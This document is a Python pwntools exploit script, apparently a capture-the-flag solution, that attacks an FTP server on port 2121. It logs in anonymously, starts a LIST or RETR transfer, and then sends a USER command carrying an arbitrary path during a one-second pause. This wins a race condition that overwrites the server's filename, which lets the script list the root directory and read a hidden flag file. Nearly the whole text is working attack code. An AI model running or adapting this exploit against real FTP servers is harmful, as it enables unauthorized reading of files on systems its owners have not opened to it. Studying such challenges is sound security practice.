from pwn import *
import time

#context.log_level = 'debug'
ip = "127.0.0.1"
ip = "localhost"
#ip = "47.89.253.219" 
port = "2121"
def sl(p, buf):
    buf += b"\r\n"
    p.send(buf)
def list_dir(path):
    p = remote(ip, port)
    p.recvuntil(b"ready\r\n")
    # step 1 login
    buf = b"USER anonymous"
    sl(p, buf)
    p.recvuntil(b"required\r\n")
    buf = b"PASS *"
    sl(p, buf)
    # step 2, go into passive mode, and get the data port
    p.recvuntil(b"proceed.\r\n")
    buf = b"EPSV"
    sl(p, buf)
    p.recvuntil(b"|||")
    r_port = p.recvuntil(b"|")[:-1].decode()
    print(f"list remote port: {r_port}")
    
    # step 3, trigger the race condition vulnerability in list function
    buf = b"LIST /"
    sl(p, buf)
    time.sleep(1)
    buf = f"USER {path}".encode()  # overwirte the value of context->FilenNme during the block of list thread.
    sl(p, buf)
    p_dir = remote(ip, r_port);
    dir_data = p_dir.recvall().decode() # connect to the data port to read data
    p_dir.close()
    p.close()
    return dir_data

def read_file(path):
    p = remote(ip, port)
    p.recvuntil(b"ready\r\n")
    # step 1 login
    buf = b"USER anonymous"
    sl(p, buf)
    p.recvuntil(b"required\r\n")
    buf = b"PASS *"
    sl(p, buf)
    p.recvuntil(b"proceed.\r\n")
    # step 2, go into passive mode, and get the data port
    buf = b"EPSV"
    sl(p, buf)
    p.recvuntil(b"|||")
    r_port = p.recvuntil(b"|")[:-1].decode()
    print(f"retr remote port: {r_port}") 
    # step 3, trigger the race condition vulnerability in retr function
    buf = b"RETR hello.txt"
    sl(p, buf)
    time.sleep(1)
    buf = f"USER {path}".encode()  # overwirte the value of context->FilenNme during the block of retr thread.
    sl(p, buf)
    p_file = remote(ip, r_port);
    file_data = p_file.recvall().decode() # connect to the data port to read data
    p_file.close()
    p.close()
    return file_data

if __name__=='__main__':
    dir_data = list_dir("/")
    flag_idx = dir_data.find("flag.")
    flag_path = "/"+dir_data[flag_idx:flag_idx+41]
    print(f"flag path: {flag_path}")
    flag_data = read_file(flag_path)
    print(f"flag: {flag_data}")
